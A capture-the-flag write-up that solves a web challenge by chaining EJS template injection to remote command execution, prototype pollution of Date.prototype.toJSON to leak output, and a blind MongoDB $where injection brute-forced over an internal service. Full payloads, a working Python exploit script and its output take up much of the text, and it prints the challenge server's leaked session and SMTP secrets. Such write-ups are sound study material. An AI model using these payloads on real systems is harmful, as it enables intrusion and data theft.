---
created: 2025-08-23T22:07
updated: 2025-08-24T12:12
description: A very fun web SSTI + internal resource hacking challenge from DDCCTF!
---
> Koro-Render
> 416
> hmcdat
> Nagisa is a senior cybersecurity student whose professor is Korosensei, a mysterious octopus-like creature. During a web security lecture, this peculiar teacher accidentally revealed a mysterious website, and unfortunately for him, Nagisa quickly noted down the website's address. Driven by curiosity and wanting to learn more about his strange professor, Nagisa has decided to team up with you to investigate this website further. Can you help him uncover its secrets?
> 
> (Updated) The flag is in Korosensei's profile.
> 
> http://165.22.50.111:8000/

First looks at the challenge may suggest XSS but no, we have free SSTI!

The user message is first filtered through `xssFilter` then through a blacklist.

```js
let userMsg = xssFilter.filter(msg.text);

io.to(room).emit('message', {
  username: socket.username,
  text: `<textarea readonly>${userMsg}</textarea>`,
  avatar: socket.avatar,
  timestamp: new Date()
});

const forbidden = require('./data/bad_words.json');

if (forbidden.some(term => userMsg.includes(term))) {
  io.to(room).emit('message', {
	username: "Korosensei",
	text: 'Please be polite, your template contains profanity words.',
	avatar: '/images/korosensei.png',
	timestamp: new Date()
  });
  return
}

try {
  ejs.render(userMsg, {});
  io.to(room).emit('message', {
	username: "Korosensei",
	text: 'Your template is safe!',
	avatar: '/images/korosensei.png',
	timestamp: new Date()
  });
} catch (error) {
  io.to(room).emit('message', {
	username: "Korosensei",
	text: 'Your template is not working properly!',
	avatar: '/images/korosensei.png',
	timestamp: new Date()
  });
}
```

## Free SSTI

### Bypassing the filters
Turns out a simple `ejs` payload such as this will pass the xss filter, like, to me it was as if it was not there, not once did it trigger.

```js
xssFilter.filter(msg.text);
```

```js
<%= 1+1 %>
```

And the blacklist doesn't even contain `eval` and `atob`, so we can run any code with the combo.

```js
eval(atob("..."))
```

The web worker (I suspect it is a web worker or a second module or something) environment doesn't have `require`, but we can bypass it quite easily with `process.mainModule.require`.

We can test our payload locally like this.

```js
const ejs = require("ejs");
var XSSFilter = require("xssfilter");
var xssFilter = new XSSFilter();
const forbidden = require("./data/bad_words.json");

// was trying to bypass with string concats but realized eval isnt even blocked
const payload = `<%=eval(atob('B64'))%>`.replace(
  "B64",
  btoa(`process.mainModule.require('child_process').execSync("ls")`)
);
console.log("Payload:", payload);
let userMsg = xssFilter.filter(payload);
console.log("Filtered Payload:", userMsg);
for (const term of forbidden) {
  if (userMsg.includes(term)) {
    console.log("Payload contains forbidden term:", term);
  }
}
const result = ejs.render(payload, {}, (err, str) => {
  if (err) {
    console.log("Template rendering failed:", err.message);
  } else {
    console.log("Template rendered successfully:", str);
  }
});

console.log(result);
```

### Exfiltration

According to the author, there is no network access, so we can't just send the data out via webhooks, how do we get the result of the code back to us?

However looking at the code again, we can see a `new Date()`.

```js
io.to(room).emit('message', {
	username: "Korosensei",
	text: 'Your template is safe!',
	avatar: '/images/korosensei.png',
	timestamp: new Date()
});
```

Hrm, what if we prototype pollute the `toJSON` and make this return a value to us?

```js
Date.prototype.toJSON=()=>process.mainModule.require('child_process').execSync("ls")
```

```json
{
   "username":"Korosensei",
   "text":"Nurufufufu~ Welcome kumo! I am your beloved octopus teacher, Korosensei! I can taste-test your templates for any dangerous ingredients. Please share your template with me, and I'll evaluate it with my super-speed analysis! Nurufufufu~",
   "avatar":"/images/korosensei.png",
   "timestamp":"data\nmiddleware\nnode_modules\npackage-lock.json\npackage.json\npublic\nroutes\nserver.js\nviews\n"
}
```

It worked!

Let's look at `env`, hrm not very useful.

```json
{
   "NODE_VERSION":"22.18.0",
   "HOSTNAME":"68e2d0e98ef4",
   "YARN_VERSION":"1.22.22",
   "SMTP_PORT":"8025",
   "SHLVL":"1",
   "PORT":"8000",
   "HOME":"/home/node",
   "SESSION_SECRET":"539583e43dc39e049314998a5a9d6ce599121b06ecddf95fa2f387b6",
   "AUTH_SERVICE_URL":"http://auth:3000",
   "SMTP_WEB_PORT":"8080",
   "GOOGLE_RECAPTCHA_SITE_KEY":"6Le-mowrAAAAAMJcDkgDp-Cg9etb6lZczFogq9K8",
   "PATH":"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
   "SMTP_FROM":"No Reply",
   "SMTP_PASS":"94bb5f98b38747b23a436a51a9c346ad2e172045",
   "PWD":"/usr/src/app",
   "NODE_ENV":"development",
   "SMTP_HOST":"smtp",
   "SMTP_USER":"no.reply@cyberjutsu.io"
}
```

## Bad Infra

I spent hours trying to write a automated script and the server was also just crashing every second.

So even though I have full RCE I just couldn't test any more payloads.

I thought about using the `SESSION_SECRET` to craft session cookies but never actually tried it.

This is also where I will complain about the challenge not being instanced, how can the author have a non instanced free RCE SSTI?

I got stuck for a bit and decided to look at `auth`, because the flag doesn't seem to exist on the machine where `app` is on.


## Auth Server

The `app` server doesn't have anything useful actually, it just proxies requests to `http://auth:3000`, which is running a mongoDB and an API.

The flag lives on the `auth` server, inside the `note` field of `Korosensei` most likely.

```js
const userSchema = new mongoose.Schema({
  username: { type: String, required: true, unique: true },
  email:    { type: String, required: true, unique: true },
  name:     { type: String, default: "null" },
  password: { type: String, required: true },
  isAdmin:  { type: Boolean, default: false },
  note: { type: String, default: null },
});
```

Well how do we get it? In no route is it actually returned.

However, one route stands out.

```js
router.post("/lookup", async function (req, res, next) {
  let { username } = req.body;

  if (!username) {
    return res.status(400).json({ message: "Missing username" });
  }

  try {
    const resultArr = await User.collection
      .find({ $where: `this.username == '${username}'` })
      .toArray();
    if (!resultArr.length) {
      return res.status(404).json({ message: "User not found" });
    }

    let data = resultArr[0];

    // let maskedEmail = email.replace(/(.{2})(.*)(.{2})(@.*)/, (match, p1, p2, p3, p4) => {
    //   return p1 + '*'.repeat(p2.length) + p3 + p4;
    // });

    res.status(200).json(data);
  } catch (err) {
    console.error("Error looking up user:", err);
    res.status(500).json({ message: "Internal server error" });
  }
});
```

This route is not actually even used by `app` server, so that is already very suspicious.

Furthermore it has a free NoSQL injection, which means we can apply logic on `note`.

```js
.find({ $where: `this.username == '${username}'` })
```

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1756003406/20250823224325937.png/e643cb63b2ab18a57574ff638b37ba3e.png)

How useful is it? We can do a char-by-char classic SQL brute force.

Or maybe we can hack the database server!

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1756003695/20250823224815527.png/64dfc1b982dc24e047f39c2aadb37a36.png)

Oh nvm.

I guess I have to do it the char-by-char way.

### but first SSRF
To actually call `auth` server API, we need SSRF.

So how do we do all of the following in synchronous javascript?

- Fetch `http://auth:3000/lookup` a whole lot of times for each char.
- Check the output of them all and look for the one that passed.
- Return the passed back to us.

You see, `toJSON` is a sync method, so if we have anything async we will just get a promise back, which is not helpful.

The main problem is the request part, built-in network stuff in node.js are all async.

But hey, we ran commands sync right? Let's try `curl`.

#### curl

My first prototype works locally, however it errors on the remote.

```js
const ejs = require("ejs");
var XSSFilter = require("xssfilter");
var xssFilter = new XSSFilter();
const forbidden = require("./data/bad_words.json");
const io = { "some data": 1, call: () => console.log("io.call()") };

const prefix = "sec";
const curl = `curl -X POST 'http://auth:3000/lookup'\
  -H 'Content-Type: application/json'\
  -d "{\\"username\\": \\"' || (this.note&&this.note.startsWith('PLACEHOLDER')) || '\\"}"`;

const payload = `<%=eval(atob('B64'))%>`.replace(
  "B64",
  btoa(
    `
const prefix='${prefix}';
const command = atob('${btoa(curl)}');
const cp = process.mainModule.require('child_process');
let found = false;
const charset = \`0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[\\]^_\\\`{|}~\`;
const needEscape = \`\\'"\\\`\`;
for (let c of charset) {
    if(needEscape.includes(c)) {c='\\\\'+c;}
  const flag = prefix + c;
  const data = cp.execSync(command.replace('PLACEHOLDER', flag)).toString();
  if(!data.includes("User not found")){
    Date.prototype.toJSON=()=>flag;
    found = true;
    break;
  }
}
if(!found) Date.prototype.toJSON=()=>"failed";
`
  )
);
console.log("Payload:", payload);
```

Turns out there is no `curl` on the server.

```json
{
   "username":"Korosensei",
   "text":"Your template is safe!",
   "avatar":"/images/korosensei.png",
   "timestamp":"Command failed: curl -X POST \\'http://auth:3000/lookup\\'  -H \\'Content-Type: application/json\\'  -d \"{\\\"username\\\": \\\"\\' || (this.note&&this.note.startsWith(\\'0\\')) || \\'\\\"}\"\n/bin/sh: curl: not found\n"
}
```


#### node

Turns out if we run a `async` script with `node`, it won't exit until all the promises resolve or reject.

You can verify it with this.

It will actually resolve with the contents of the http request.

```sh
node --eval "fetch('https://yun.ng').then(r=>r.text()).then(r=>console.log(r))"
```

This is good for us, because we previously used `execSync` to run any command and get their output in `sync` mode.

At this point I've also finally finished writing the automation script.

And all the blocks just clicked into place, my solve script is working.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1756004458/20250823230058613.png/ecf1bb4809bff976fa466368029640eb.png)

I successfully got the first next character.

> No, it did not work directly, due to the layers of base64 and also the lack of error messages when I have syntax errors in the payload due to layer of escaped quotes. My script became ultra fragile, and slight edits could break it, it was also pain to debug, also the server may crash on it.

## solve script

Small explanation of the solve:
- Registers and login
- Sends a SSTI payload to the server which
	- Spawns a node running a script which
		- Requests `/lookup` with all possible chars for a specific position, the one that passes will print out the char
	- node script resolves with the output of the payload `kumo leaks flag X`
	- Prototype pollute `Date.prototype.toJSON` to return the output
- Expect to receive that in the `timestamp` field
- If it worked, add it to the current flag progress and repeat

This script is error-resilient and self-resurrecting because the server is just bad.

But luckily at this time the participants are mostly asleep or have given up, so my script ran smoothly during the last hour of the CTF.

```python
import base64
import random
import time
import requests
import socketio
import json

BAD_WORDS = json.loads(open("bad_words.json").read())

target = "http://165.22.50.111:8000"

def get_cookie():
    try:
        s = requests.Session()
        uname = "kumo"+str(random.randint(10000, 99999))
        password = "kumokumo"
        r=s.post(f"{target}/auth/register", data={
            "name": "kumo",
            "email":f"{uname}@kumo.kumo",
            "username": uname,
            "password": password
        })
        r=s.post(f"{target}/auth/login", data={
            "username": uname,
            "password": password
        })
        cookie_header = "; ".join([f"{k}={v}" for k, v in s.cookies.items()])
        if f"const username = '{uname}';" in r.text:
            print("[*] Logged in successfully")
            return cookie_header, uname
        else:
            time.sleep(1)
            return get_cookie()
    except Exception as e:
        print("Error during get_cookie:", e)
        time.sleep(1)
        return get_cookie()
#const charset = `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[\\]^_\\\`{|}~\`;

prefix = ""

def get_payload(prefix):
    async_code = """
const charset = `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&'()*+,-./:;<=>?@[\\\\]^_\\`{|}~`;
const needEscape = `'"\\``;
const arr = charset.split('').map(c => needEscape.includes(c) ? '\\\\' + c : c);
for(let c of arr){
    let code = c.charCodeAt(0);
    fetch(
    `http://auth:3000/lookup`,
    {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({username: `' || (this.note&&this.note.startsWith('D')&&this.note.charCodeAt(INDEX)===${code}) || '`})
    }
).then(r=>r.json()).then(r=>{
    if(!r.message){
        console.log('kumo leaks flag',String.fromCharCode(code));
    }
}).catch(e=>console.log(e));
}
""".replace("PREFIXPREFIX", prefix).replace("INDEX", str(len(prefix)))
# print(async_code)
# async_code = """
# 1+1
# """

    payload = f"""
let data;
try{{
    data = process.mainModule.require('child_process').execSync(`node --eval 'eval(atob("{base64.b64encode(async_code.encode()).decode()}"))'`).toString();
}} catch(e){{
    data = "Error: " + e.message;
}}
Date.prototype.toJSON=()=>{{
    return data;
}}
"""
    payload = f"<%=eval(atob('{base64.b64encode(payload.encode()).decode()}'))%>"

    for word in BAD_WORDS:
        if word in payload:
            # convert to \xXX format
            hex_word = ''.join([f"\\x{ord(c):02x}" for c in word])
            payload = payload.replace(word, hex_word)
    return payload
while True:
    cookie,uname=get_cookie()
    sio = socketio.Client()
    @sio.event
    def connect():
        print("[*] Connected to server")
        # time.sleep(1)
        
        print("[*] Payload sent")
    @sio.event
    def disconnect():
        print("[*] Disconnected from server")
    @sio.event
    def message(data):
        if 'kumo' in data.get('username', ''):
            return
        print(data)
        if 'timestamp' in data and data['text'] == 'Your template is safe!':
            print("[*] Exploit likely worked")
            if 'kumo leaks flag ' in data.get('timestamp', ''):
                flag = data['timestamp'].split('kumo leaks flag ')[1].strip()
                global prefix
                prefix += flag
                print(f"[+] Flag so far: {prefix}")
                sio.emit("message", ({
                    "text": get_payload(prefix),
                },uname))
        if 'Nurufufufu~' in data.get('text', ''):
            sio.emit("message", ({
                "text": get_payload(prefix),
            },uname))
    try:
        print("[*] Connecting to socket.io")
        sio.connect(target, headers={"Cookie": cookie})
        sio.wait()
    except Exception as e:
        print("Socket.IO connection error:", e)
        time.sleep(1)
        print("[*] Reconnecting...")
    finally:
        sio.disconnect()
        sio.shutdown()
```

```
❯ python solve.py
[*] Logged in successfully
[*] Connecting to socket.io
[*] Connected to server
[*] Payload sent
{'username': 'Korosensei', 'text': "Nurufufufu~ Welcome kumo60974! I am your beloved octopus teacher, Korosensei! I can taste-test your templates for any dangerous ingredients. Please share your template with me, and I'll evaluate it with my super-speed analysis! Nurufufufu~", 'avatar': '/images/korosensei.png', 'timestamp': '2025-08-24T02:05:27.870Z'}
{'username': 'Korosensei', 'text': 'Your template is safe!', 'avatar': '/images/korosensei.png', 'timestamp': 'kumo leaks flag D\n'}
[*] Exploit likely worked
[+] Flag so far: D
{'username': 'Korosensei', 'text': 'Your template is safe!', 'avatar': '/images/korosensei.png', 'timestamp': 'kumo leaks flag D\n'}
[*] Exploit likely worked
[+] Flag so far: DD
{'username': 'Korosensei', 'text': 'Your template is safe!', 'avatar': '/images/korosensei.png', 'timestamp': 'kumo leaks flag C\n'}
[*] Exploit likely worked
[+] Flag so far: DDC
{'username': 'Korosensei', 'text': 'Your template is safe!', 'avatar': '/images/korosensei.png', 'timestamp': 'kumo leaks flag {\n'}
[*] Exploit likely worked
[+] Flag so far: DDC{

...

[+] Flag so far: DDC{Th3_F!rs7_7ImE_You_sEE_B1IND_5sTi?_66b83a239b48ec6663643c3970b39
{'username': 'Korosensei', 'text': 'Your template is safe!', 'avatar': '/images/korosensei.png', 'timestamp': 'kumo leaks flag d\n'}
[*] Exploit likely worked
[+] Flag so far: DDC{Th3_F!rs7_7ImE_You_sEE_B1IND_5sTi?_66b83a239b48ec6663643c3970b39d
{'username': 'Korosensei', 'text': 'Your template is safe!', 'avatar': '/images/korosensei.png', 'timestamp': 'kumo leaks flag 7\n'}
[*] Exploit likely worked
[+] Flag so far: DDC{Th3_F!rs7_7ImE_You_sEE_B1IND_5sTi?_66b83a239b48ec6663643c3970b39d7
{'username': 'Korosensei', 'text': 'Your template is safe!', 'avatar': '/images/korosensei.png', 'timestamp': 'kumo leaks flag a\n'}
[*] Exploit likely worked
[+] Flag so far: DDC{Th3_F!rs7_7ImE_You_sEE_B1IND_5sTi?_66b83a239b48ec6663643c3970b39d7a
[*] Disconnected from server
[*] Logged in successfully
[*] Connecting to socket.io
[*] Connected to server
[*] Payload sent
{'username': 'Korosensei', 'text': "Nurufufufu~ Welcome kumo48799! I am your beloved octopus teacher, Korosensei! I can taste-test your templates for any dangerous ingredients. Please share your template with me, and I'll evaluate it with my super-speed analysis! Nurufufufu~", 'avatar': '/images/korosensei.png', 'timestamp': 'kumo leaks flag a\n'}
{'username': 'Korosensei', 'text': 'Your template is safe!', 'avatar': '/images/korosensei.png', 'timestamp': 'kumo leaks flag }\n'}
[*] Exploit likely worked
[+] Flag so far: DDC{Th3_F!rs7_7ImE_You_sEE_B1IND_5sTi?_66b83a239b48ec6663643c3970b39d7a}
{'username': 'Korosensei', 'text': 'Your template is safe!', 'avatar': '/images/korosensei.png', 'timestamp': ''}
[*] Exploit likely worked
```

### flag
```flag
DDC{Th3_F!rs7_7ImE_You_sEE_B1IND_5sTi?_66b83a239b48ec6663643c3970b39d7a}
```

~~Fun~~ fact, because the script was so fragile first few attempts to automate it failed, so as I was trying to automate it while also manually solving for next chars, I realized that `{` would break my payload for some whatever reason, so I changed the condition from `startsWith` to `charCodeAt() ===` which was a lot more robust.

However I realized that for the first few chars after the `{`, there are multiple matches.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1756005218/20250823231338370.png/e33227dfc6b625cd5b986335463e9d78.png)

Over here I just took a few guesses and after a few characters I made a working automated solve script.

... which caused the flag to be incorrect!

I thought it was `DDC{Th4...` instead of `DDC{Th3`, dumb mistake lmao.

Also since I am returning the result in a prototype polluted `Date`, it means the flag is being broadcast to everyone. For the first 10 chars or so it was broadcasting the full flag, then it was broadcasting char by char, then it broadcast the entire flag char by char again.